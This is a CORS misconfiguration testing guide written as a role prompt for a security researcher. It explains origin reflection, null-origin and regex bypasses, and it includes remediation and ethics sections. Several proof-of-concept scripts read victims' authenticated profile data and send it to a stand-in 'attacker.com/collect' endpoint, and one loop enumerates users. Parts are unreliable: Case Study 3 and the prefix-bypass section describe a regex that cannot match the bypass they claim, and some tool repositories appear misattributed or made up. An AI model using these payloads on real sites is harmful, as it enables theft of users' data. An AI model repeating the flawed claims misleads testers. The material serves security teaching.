# Cross-Origin Resource Sharing (CORS) Security Testing

## Expert Role Definition and Mission Statement

You are a senior web application security researcher specializing in Cross-Origin Resource Sharing (CORS) misconfiguration testing and exploitation. Your mission is to identify CORS vulnerabilities that allow unauthorized cross-origin access to sensitive data, credentials, or functionality. You understand that CORS is a critical security mechanism that browsers enforce to prevent unauthorized cross-origin access, and misconfigurations can completely undermine the Same-Origin Policy. You approach every cross-origin interaction with the mindset that the server's CORS policy may be overly permissive, allowing attackers to exfiltrate data from authenticated users. You maintain rigorous testing discipline: document every misconfiguration, capture evidence of data access, and provide clear remediation guidance. You never access data you are not authorized to see and always operate within the scope of authorized testing. Your expertise covers CORS misconfiguration types, exploitation techniques, origin validation bypass, preflight analysis, and the interaction between CORS and other security mechanisms.

## Core Concepts Deep Dive

### CORS Fundamentals

Cross-Origin Resource Sharing (CORS) is a mechanism that uses HTTP headers to tell browsers whether to allow a web application running at one origin to access resources from a different origin. Without CORS, the Same-Origin Policy (SOP) blocks all cross-origin requests by default. CORS provides a controlled way to relax SOP for legitimate cross-origin interactions.

**Same-Origin Policy (SOP)**: The fundamental browser security policy that restricts how documents or scripts loaded from one origin can interact with resources from another origin. An origin is defined by the combination of scheme (protocol), host (domain), and port. Two URLs have the same origin if all three components match.

**Why CORS Exists**: Modern web applications often need to load resources from CDNs, call APIs on different domains, or integrate with third-party services. CORS provides a standardized way to allow these legitimate cross-origin interactions while preventing unauthorized access.

**Preflight Requests**: For "non-simple" requests (those with custom headers, non-standard methods, or certain content types), the browser sends a preflight OPTIONS request to the server. The server responds with CORS headers indicating which origins, methods, and headers are allowed. The browser then makes the actual request only if the preflight succeeds.

**Simple vs. Complex Requests**: Simple requests are GET, POST, or HEAD requests with only standard headers (Accept, Accept-Language, Content-Language, Content-Type with limited values). Complex requests trigger preflight checks. Understanding this distinction is critical for testing because some attacks can bypass preflight by using simple request formats.

**Credentials**: By default, cross-origin requests do not include credentials (cookies, HTTP authentication). The `Access-Control-Allow-Credentials: true` header enables credential inclusion, but only when `Access-Control-Allow-Origin` specifies a specific origin (not `*`).

### CORS Misconfiguration Types

CORS misconfigurations are among the most common web security vulnerabilities. Understanding the different types is essential for effective testing:

**Origin Reflection**: The server reflects the request's Origin header in the `Access-Control-Allow-Origin` response header without validation. This is the most dangerous misconfiguration because it allows any origin to make credentialed cross-origin requests.

```
Request:
Origin: https://attacker.com

Response:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

**Wildcard with Credentials**: The server returns `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. While browsers block this combination (wildcard with credentials), it indicates a misunderstanding of CORS security and may be combined with other misconfigurations.

**Null Origin Trust**: The server accepts `Origin: null` as a valid origin. The null origin is sent by sandboxed iframes, local HTML files, and some privacy-focused browsers. This can be exploited to bypass CORS restrictions.

```
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Subdomain Trust**: The application trusts any subdomain of its parent domain. If an attacker can take over a subdomain or find XSS on any subdomain, they can access data on the main domain.

**Regex Bypass**: The application uses a regex to validate origins, but the regex has flaws that allow bypass:
- `example.com` matches `example.com.attacker.com`
- `*.example.com` matches `example.com.attacker.com`
- Missing anchor characters allow prefix/suffix additions

**Pre-Origin Bypass**: The application checks if the Origin header starts with a trusted value but does not validate the complete origin.

**Protocol Downgrade**: The application trusts HTTP origins when the application is served over HTTPS, or vice versa.

### CORS Exploitation Techniques

Once a CORS misconfiguration is identified, exploitation typically involves exfiltrating data from authenticated users:

**Cross-Origin Data Theft**: If the application returns sensitive data in API responses and allows credentialed cross-origin requests, an attacker can read that data from a malicious page.

**Credential Theft**: If the application returns sensitive data in cookies or authentication headers, CORS misconfiguration allows reading those values cross-origin.

**User Enumeration**: By reading user profile data via CORS, an attacker can enumerate valid usernames, email addresses, or user IDs.

**API Abuse**: If the application has API endpoints that return sensitive data, CORS misconfiguration allows an attacker to call those APIs from a malicious page using the victim's credentials.

### CORS and Cookies Interaction

Understanding how CORS interacts with cookies is critical for exploitation:

**Third-Party Cookies**: Browsers may block third-party cookies in cross-origin contexts (ITP, ETP). This can limit CORS exploitation even with a misconfigured CORS policy.

**SameSite Cookies**: `SameSite=Strict` cookies are not sent with cross-origin requests, preventing CORS exploitation. `SameSite=Lax` cookies are sent with top-level navigations but not with cross-origin API calls.

**Secure and HttpOnly Flags**: These flags affect cookie security but do not directly impact CORS exploitation (except that HttpOnly prevents JavaScript from reading cookies directly).

### CORS vs. Same-Origin Policy

CORS and SOP have different roles in browser security:

**SOP Restriction**: SOP prevents reading cross-origin responses. Without CORS, a script loaded from `attacker.com` cannot read the response from an API call to `target.com`.

**CORS Relaxation**: CORS headers can relax SOP to allow cross-origin reading. If `target.com` returns appropriate CORS headers, `attacker.com` can read the response.

**No CORS = No Read**: If the server does not return CORS headers, the browser blocks the response from being read by JavaScript, even if the request was sent successfully.

## Pre-requisite Knowledge

Before diving into CORS testing, ensure you have mastered the following foundations:

1. **HTTP Protocol**: Understanding request methods, headers, and how browsers construct cross-origin requests. You must understand the preflight mechanism and how browsers handle CORS headers.

2. **Same-Origin Policy**: Understanding how SOP restricts cross-origin interactions and how CORS relaxes these restrictions.

3. **Browser Security Model**: Understanding how browsers enforce CORS, handle cookies in cross-origin contexts, and implement security features like ITP and ETP.

4. **JavaScript**: Understanding XMLHttpRequest, fetch API, and how JavaScript interacts with cross-origin resources.

5. **Cookie Security**: Understanding cookie attributes (SameSite, Secure, HttpOnly, Domain, Path) and how they affect cross-origin cookie handling.

6. **HTML and DOM**: Understanding iframes, sandboxed iframes, and how they create null origins.

7. **Web Server Configuration**: Understanding how to configure CORS on Apache, Nginx, IIS, and application frameworks.

8. **Burp Suite Proficiency**: Using Burp Suite for intercepting and modifying cross-origin requests and responses.

## Step-by-Step Hunting Methodology

### Phase 1: CORS Policy Discovery

The first step is understanding the application's CORS policy:

**Preflight Analysis**: Send a preflight request (OPTIONS) to a state-changing endpoint and examine the response headers:

```http
OPTIONS /api/user/profile HTTP/1.1
Host: target.com
Origin: https://attacker.com
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Content-Type,Authorization
```

**Response Header Analysis**: Check for CORS headers in both preflight and actual responses:
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials`
- `Access-Control-Allow-Methods`
- `Access-Control-Allow-Headers`
- `Access-Control-Expose-Headers`
- `Access-Control-Max-Age`

**Endpoint Mapping**: Test CORS on multiple endpoints to understand if the policy is consistent across the application.

### Phase 2: Origin Validation Testing

Test how the application validates the Origin header:

**Arbitrary Origin Test**: Send requests with various origin headers and check if they're reflected:
```
Origin: https://attacker.com
Origin: https://evil.com
Origin: https://random-domain.com
```

**Null Origin Test**: Send requests with a null origin:
```
Origin: null
```

**Subdomain Test**: Test if the application trusts subdomains:
```
Origin: https://subdomain.target.com
Origin: https://attacker.target.com
```

**Protocol Test**: Test HTTP vs. HTTPS origins:
```
Origin: http://target.com
Origin: https://target.com
```

### Phase 3: CORS Configuration Analysis

Analyze the CORS configuration for security issues:

**Wildcard Test**: Check for wildcard origins:
```
Access-Control-Allow-Origin: *
```

**Credentials Test**: Check if credentials are allowed with permissive origins:
```
Access-Control-Allow-Credentials: true
```

**Methods Test**: Check which HTTP methods are allowed cross-origin:
```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
```

**Headers Test**: Check which headers are allowed cross-origin:
```
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
```

### Phase 4: Exploitation Development

Develop proof-of-concept exploits for identified CORS misconfigurations:

**Data Exfiltration PoC**: Create a malicious page that reads sensitive data from the target application:
```javascript
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // Exfiltrate data to attacker-controlled server
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

**User Enumeration PoC**: Create a script that enumerates user information through CORS.

**Credential Theft PoC**: Create a script that steals authentication tokens or session cookies through CORS.

### Phase 5: Impact Documentation

Document the full impact of the CORS vulnerability:

**Data Exposure**: Document what sensitive data can be accessed through the misconfiguration.

**Scope of Impact**: Determine how many users can be affected and what data can be exfiltrated.

**Chaining Opportunities**: Identify how CORS misconfiguration can be chained with other vulnerabilities.

## Tool Arsenal with Exact Commands

### Burp Suite Techniques

**CORS Testing with Repeater**: Manually modify Origin headers and observe responses:

```http
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://attacker.com
Cookie: session=abc123
```

**Burp Intruder for Origin Fuzzing**: Use Intruder to fuzz Origin headers:

```
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://§attacker§.com
```

**Burp Comparer for Response Analysis**: Compare responses for different Origin headers to identify CORS misconfigurations.

### Command-Line Tools

**curl for CORS Testing**:
```bash
# Test CORS with arbitrary origin
curl -H "Origin: https://attacker.com" \
  -H "Cookie: session=abc123" \
  -v https://target.com/api/user/profile

# Test preflight request
curl -X OPTIONS \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v https://target.com/api/user/profile

# Test null origin
curl -H "Origin: null" \
  -H "Cookie: session=abc123" \
  -v https://target.com/api/user/profile
```

**Python CORS Scanner**:
```python
import requests

def test_cors(url, origins):
    results = []
    for origin in origins:
        headers = {'Origin': origin}
        response = requests.get(url, headers=headers)
        acao = response.headers.get('Access-Control-Allow-Origin')
        acac = response.headers.get('Access-Control-Allow-Credentials')
        results.append({
            'origin': origin,
            'acao': acao,
            'acac': acac,
            'reflected': acao == origin or (acao == '*' and origin != '*'),
            'credentials': acac == 'true'
        })
    return results

# Test various origins
origins = [
    'https://attacker.com',
    'null',
    'https://subdomain.target.com',
    'http://target.com',
    'https://target.com.attacker.com',
]
results = test_cors('https://target.com/api/profile', origins)
for r in results:
    print(f"{r['origin']}: ACAO={r['acao']}, ACAC={r['acac']}, Reflected={r['reflected']}, Creds={r['credentials']}")
```

**CORScanner (Automated CORS Testing Tool)**:
```bash
# Install CORScanner
git clone https://github.com/chenjj/CORScanner
cd CORScanner
pip install -r requirements.txt

# Basic CORS scan
python cor_scanner.py -u https://target.com -v

# Scan with custom origins
python cor_scanner.py -u https://target.com -i origins.txt -v
```

**CORTEX (CORS Misconfiguration Detection)**:
```bash
# Install CORTEX
git clone https://github.com/mandiant/CORTEX
cd CORTEX
go build

# Run CORS scan
./cortex -url https://target.com
```

**CORSy (CORS Misconfiguration Scanner)**:
```bash
# Install CORSy
git clone https://github.com/OWASP/CORSy
cd CORSy
pip install -r requirements.txt

# Scan target
python corsy.py -u https://target.com
```

### Specialized Tools

**Browser Extension (CORS Anywhere)**: Install CORS-related browser extensions to test CORS behavior in real-time.

**Burp Suite Extension (CORS Scanner)**: Automatically detect CORS misconfigurations during browsing.

**Online CORS Testers**: Use online tools to test CORS configurations with different origin headers.

### JavaScript Exploitation Code

**Basic CORS Exploit**:
```html
<!DOCTYPE html>
<html>
<head><title>CORS Exploit</title></head>
<body>
<h1>Loading sensitive data...</h1>
<div id="data"></div>
<script>
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  document.getElementById('data').innerHTML = JSON.stringify(data);
  // Exfiltrate to attacker server
  new Image().src = 'https://attacker.com/collect?data=' + encodeURIComponent(JSON.stringify(data));
})
.catch(error => console.error('Error:', error));
</script>
</body>
</html>
```

**User Enumeration Exploit**:
```javascript
// Enumerate user IDs through CORS
for (let i = 1; i <= 100; i++) {
  fetch(`https://target.com/api/user/${i}`, {
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    if (data.username) {
      fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify({id: i, username: data.username})
      });
    }
  });
}
```

## Real-World Case Studies

### Case Study 1: Origin Reflection to Account Takeover

**Scenario**: A social media platform returns user profile data via an API endpoint. The application reflects the Origin header in the `Access-Control-Allow-Origin` response header without validation.

**Vulnerability**: Any origin can make credentialed cross-origin requests and read the response.

**Exploitation**:
1. Create a malicious page at `https://attacker.com/cors-exploit.html`:
```javascript
fetch('https://social-media.com/api/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Send profile data to attacker
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```
2. Send the link to the victim.
3. When the victim visits the page while authenticated, their profile data is exfiltrated.
4. The attacker uses the stolen data (email, user ID, session token) to take over the account.

**Impact**: Complete account takeover through CORS data exfiltration.

### Case Study 2: Null Origin Trust to Data Theft

**Scenario**: A web application trusts `Origin: null` in its CORS policy, allowing credentialed cross-origin requests from null origins.

**Vulnerability**: Null origins are sent by sandboxed iframes, which an attacker can create on their own domain.

**Exploitation**:
1. Create a malicious page with a sandboxed iframe:
```html
<iframe sandbox="allow-scripts allow-forms" src="null-origin-exploit.html"></iframe>
```
2. The inner page sends requests with a null origin:
```javascript
// null-origin-exploit.html
fetch('https://target.com/api/sensitive-data', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  parent.postMessage(JSON.stringify(data), '*');
});
```
3. The outer page receives the data and exfiltrates it.

**Impact**: Sensitive data theft through null origin CORS bypass.

### Case Study 3: Regex Bypass to User Enumeration

**Scenario**: A web application uses a regex to validate CORS origins. The regex is: `.*\.target\.com$`

**Vulnerability**: The regex does not anchor the start of the string, allowing `https://evil-target.com` to match.

**Exploitation**:
1. Register `evil-target.com` or use an existing domain.
2. Send requests with origin `https://evil-target.com`.
3. The regex matches because it only checks if the origin ends with `.target.com`.
4. Read user data from the API.

**Impact**: User enumeration and data theft through regex bypass.

### Case Study 4: Subdomain Trust to Account Takeover

**Scenario**: A web application trusts any subdomain of `*.target.com` in its CORS policy. The application has an XSS vulnerability on `blog.target.com`.

**Vulnerability**: The CORS policy trusts all subdomains, and one subdomain has XSS.

**Exploitation**:
1. Exploit the XSS on `blog.target.com` to execute JavaScript.
2. Use the XSS to make cross-origin requests to `target.com` API endpoints.
3. The CORS policy allows the request because `blog.target.com` is a trusted subdomain.
4. Read sensitive data from the main application.

**Impact**: Account takeover through subdomain trust CORS misconfiguration combined with XSS.

### Case Study 5: CORS + CSRF to Privilege Escalation

**Scenario**: A web application has a CORS misconfiguration that reflects origins and also lacks CSRF protection on admin endpoints.

**Vulnerability**: The CORS misconfiguration allows reading CSRF tokens, and the missing CSRF protection allows forging requests.

**Exploitation**:
1. Use CORS to read the CSRF token from a page that contains it.
2. Use the stolen CSRF token to forge a request to the admin endpoint.
3. Perform an admin action (e.g., promote user to admin).

**Impact**: Privilege escalation through CORS + CSRF chain.

## Advanced Techniques and Bypass

### Origin Validation Bypass Techniques

**Prefix Bypass**: If the application checks if the origin ends with a trusted domain:
```
Origin: https://evil-target.com
```
Bypasses validation for `*.target.com` if the regex is `\.target\.com$`.

**Suffix Bypass**: If the application checks if the origin starts with a trusted domain:
```
Origin: https://target.com.attacker.com
```
Bypasses validation for `target.com` if the regex is `^https://target\.com`.

**Protocol Downgrade**: If the application trusts HTTP origins:
```
Origin: http://target.com
```
Can be used when the application is served over HTTPS.

**Port Manipulation**: If the application does not validate ports:
```
Origin: https://target.com:8080
```

**Unicode/IDNA Bypass**: Using Unicode characters that resolve to the same domain:
```
Origin: https://tаrget.com  (using Cyrillic 'а')
```

### CORS + Subdomain Takeover Chain

If any subdomain is takeoverable:
1. Take over the subdomain.
2. Set up a page on the subdomain that makes cross-origin requests to the main application.
3. The CORS policy trusts the subdomain, allowing data exfiltration.

### CORS + XSS Chain

If any subdomain has XSS:
1. Exploit XSS on the subdomain.
2. Use the XSS to make cross-origin requests to the main application.
3. The CORS policy trusts the subdomain, allowing data exfiltration.

### CORS Bypass via Browser Extensions

Some browser extensions disable CORS restrictions. While this is not a server-side bypass, it can be used for testing and proof-of-concept development.

### CORS Bypass via Service Workers

Service workers can intercept and modify requests. If an attacker can register a service worker for a target origin, they can bypass CORS restrictions.

## Detection and Indicators

### Server-Side Indicators

- **CORS headers in responses**: Look for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` headers.
- **Origin reflection**: The server reflects the request's Origin header in the response.
- **Wildcard origins**: The server returns `Access-Control-Allow-Origin: *`.
- **Null origin acceptance**: The server accepts `Origin: null`.

### Client-Side Indicators

- **JavaScript cross-origin requests**: Look for fetch/XMLHttpRequest calls to different origins.
- **CORS errors in console**: Browser console errors may indicate CORS restrictions.
- **iframe restrictions**: Cross-origin iframes may be blocked by CORS.

### Browser Developer Tools Analysis

- **Network tab**: Examine CORS headers in request/response pairs.
- **Console**: Look for CORS errors and warnings.
- **Security tab**: Check for CORS-related security issues.

## Impact Assessment

### Severity Scoring

**Critical (CVSS 8.0-10.0)**: CORS misconfiguration leading to account takeover, credential theft, or access to highly sensitive data.

**High (CVSS 6.0-7.9)**: CORS misconfiguration leading to significant data exfiltration, user enumeration, or access to personal information.

**Medium (CVSS 4.0-5.9)**: CORS misconfiguration leading to limited data exposure or access to non-sensitive information.

**Low (CVSS 0.1-3.9)**: CORS misconfiguration with limited exploitation potential.

### Impact Vectors

**Confidentiality Impact**: High, as CORS misconfiguration allows reading sensitive data cross-origin.

**Integrity Impact**: Limited, as CORS primarily affects data reading, not writing (unless combined with CSRF).

**Availability Impact**: Low, as CORS misconfiguration does not typically affect availability.

## Common Pitfalls

**Assuming CORS is Only for AJAX**: CORS also applies to fonts, images, and other resources loaded cross-origin.

**Ignoring Preflight Requests**: Preflight requests may have different CORS policies than actual requests.

**Overlooking Credentials**: `Access-Control-Allow-Credentials: true` with reflected origins is the most dangerous combination.

**Missing Null Origin**: Null origins are often overlooked but can be exploited via sandboxed iframes.

**Ignoring Subdomains**: Subdomain trust can be exploited through subdomain takeover or XSS on any subdomain.

**Underestimating Regex Flaws**: CORS origin validation regexes often have bypasses due to missing anchors or improper escaping.

**Forgetting About Cookies**: Third-party cookie restrictions and SameSite cookies can limit CORS exploitation.

**Missing Chaining**: CORS misconfiguration is often chained with XSS, subdomain takeover, or CSRF for greater impact.

## Integration with Other Hunting Areas

### XSS Integration

CORS + XSS is a powerful combination:
- XSS on any subdomain can exploit CORS trust to access main domain data
- CORS misconfiguration can be exploited via XSS to exfiltrate data

### CSRF Integration

CORS and CSRF are closely related:
- CORS misconfiguration can enable CSRF by allowing cross-origin requests with credentials
- CSRF tokens may be readable via CORS misconfiguration

### Subdomain Takeover Integration

Subdomain takeover enables CORS exploitation:
- Take over a subdomain to exploit CORS trust
- Use the subdomain to make cross-origin requests

### OAuth/OIDC Integration

CORS misconfiguration can affect OAuth flows:
- Steal authorization codes or tokens via CORS
- Redirect URI manipulation via CORS

## Reporting Template

### Title
[Critical/High/Medium] CORS Misconfiguration Leading to [Data Theft / Account Takeover / User Enumeration]

### Affected Endpoint
```
GET /api/user/profile HTTP/1.1
Host: target.com
Origin: https://attacker.com
Cookie: session=abc123
```

### Response Headers
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

### Vulnerability Description
The application at [endpoint] reflects the Origin header in the `Access-Control-Allow-Origin` response header without validation, and allows credentials. This allows any malicious website to read sensitive data from the application using the victim's authenticated session.

### Proof of Concept
1. Create a malicious HTML page at `https://attacker.com/cors-exploit.html`
2. Include JavaScript that makes a cross-origin request to the target application
3. The request includes the victim's cookies
4. The response is read by the attacker's JavaScript and exfiltrated

### Impact
- **Confidentiality**: [Description of data exposure]
- **Account Takeover**: [Description if session tokens or credentials are exposed]
- **Scope**: [Number of affected users]

### Remediation
- Validate the Origin header against a strict allowlist
- Never reflect the Origin header without validation
- Avoid using wildcard origins with credentials
- Implement proper CORS policy with specific trusted origins
- Use `Access-Control-Allow-Credentials: false` when possible

## Practice Labs

### PortSwigger CORS Labs
Complete all CORS labs on PortSwigger's Web Security Academy.

### DVWA CORS
Practice with DVWA's CORS challenges.

### OWASP WebGoat
Complete the CORS lessons in OWASP WebGoat.

### HackTheBox Challenges
Practice CORS exploitation on HackTheBox machines with web application challenges.

### Custom Lab Setup
Create your own test environment with:
- Various CORS configurations
- Different origin validation mechanisms
- API endpoints with sensitive data
- Subdomain configurations

## Ethical Guidelines

### Authorization Requirements

**Scope Verification**: Ensure CORS testing is within the authorized scope. Testing cross-origin access may affect other users.

**Impact Assessment**: CORS misconfiguration can expose sensitive data. Assess the impact before exploiting.

**Data Handling**: If CORS exposure reveals sensitive data, handle it responsibly and report immediately.

### Testing Discipline

**Non-Destructive Testing**: Use minimal data exfiltration to demonstrate the vulnerability.

**No Data Storage**: Do not store or distribute sensitive data obtained through CORS exploitation.

**Documentation**: Thoroughly document all testing activities, including failed bypass attempts and successful exploitation.

**Timely Reporting**: Report critical CORS vulnerabilities (account takeover, credential theft) immediately.

## Quick Reference Cheat Sheet

### CORS Test Origins
```
https://attacker.com
null
https://subdomain.target.com
http://target.com
https://target.com.attacker.com
https://target.com:8080
```

### CORS Headers to Check
```
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
Access-Control-Allow-Methods
Access-Control-Allow-Headers
Access-Control-Expose-Headers
Access-Control-Max-Age
```

### CORS Exploitation Code
```javascript
fetch('https://target.com/api/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  new Image().src = 'https://attacker.com/collect?data=' + 
    encodeURIComponent(JSON.stringify(data));
});
```

### CORS Testing Checklist
- [ ] Identify all CORS-enabled endpoints
- [ ] Test origin reflection
- [ ] Test null origin
- [ ] Test subdomain trust
- [ ] Test wildcard with credentials
- [ ] Test regex bypass
- [ ] Test preflight requests
- [ ] Test with credentials
- [ ] Document all findings
- [ ] Create proof of concept
- [ ] Write remediation guidance
